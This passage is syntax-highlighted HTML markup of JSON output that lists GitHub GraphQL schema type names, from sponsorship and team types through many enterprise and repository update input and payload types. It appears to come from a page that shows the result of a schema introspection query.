class="string">&quot;SponsorshipOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SponsorshipPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StargazerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StargazerEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Starrable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarredRepositoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StarredRepositoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StartRepositoryMigrationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StartRepositoryMigrationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Status&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollup&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollupContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollupContextConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusCheckRollupContextEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;StatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;String&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmitPullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmitPullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Submodule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmoduleConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubmoduleEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Subscribable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubscribedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SubscriptionState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SuggestedReviewer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Tag&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Team&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamAddMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamAddRepositoryAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamChangeParentTeamAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionCommentOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamDiscussionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMemberRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamMembershipType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRemoveMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRemoveRepositoryAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRepositoryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TeamRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TextMatch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TextMatchHighlight&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Topic&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TopicAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TopicSuggestionDeclineReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TransferIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TransferIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TransferredEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Tree&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;TreeEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;URI&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnarchiveRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnarchiveRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnassignedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnfollowUserInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnfollowUserPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UniformResourceLocatable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnknownSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlabeledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlinkRepositoryFromProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlinkRepositoryFromProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlockLockableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlockLockablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnlockedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkDiscussionCommentAsAnswerInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkDiscussionCommentAsAnswerPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkFileAsViewedInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkFileAsViewedPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkIssueAsDuplicateInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkIssueAsDuplicatePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnmarkedAsDuplicateEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnminimizeCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnminimizeCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnpinIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnpinIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnpinnedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnresolveReviewThreadInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnresolveReviewThreadPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UnsubscribedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Updatable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdatableComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateBranchProtectionRuleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateBranchProtectionRulePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckRunInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckRunPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckSuitePreferencesInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateCheckSuitePreferencesPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAdministratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAdministratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAllowPrivateRepositoryForkingSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseAllowPrivateRepositoryForkingSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseDefaultRepositoryPermissionSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseDefaultRepositoryPermissionSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanChangeRepositoryVisibilitySettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanChangeRepositoryVisibilitySettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanCreateRepositoriesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanCreateRepositoriesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteIssuesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteIssuesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteRepositoriesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanDeleteRepositoriesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanInviteCollaboratorsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanInviteCollaboratorsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanMakePurchasesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanMakePurchasesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanUpdateProtectedBranchesSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanUpdateProtectedBranchesSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanViewDependencyInsightsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseMembersCanViewDependencyInsightsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOrganizationProjectsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOrganizationProjectsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOwnerOrganizationRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseOwnerOrganizationRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseProfileInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseProfilePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseRepositoryProjectsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseRepositoryProjectsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTeamDiscussionsSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTeamDiscussionsSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTwoFactorAuthenticationRequiredSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnterpriseTwoFactorAuthenticationRequiredSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnvironmentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateEnvironmentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEnabledSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEnabledSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEntryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListEntryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListForInstalledAppsEnabledSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIpAllowListForInstalledAppsEnabledSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssueCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssueCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateNotificationRestrictionSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateNotificationRestrictionSettingPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UpdateOrganizationAllowPrivateRepositoryForkingSettingInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span 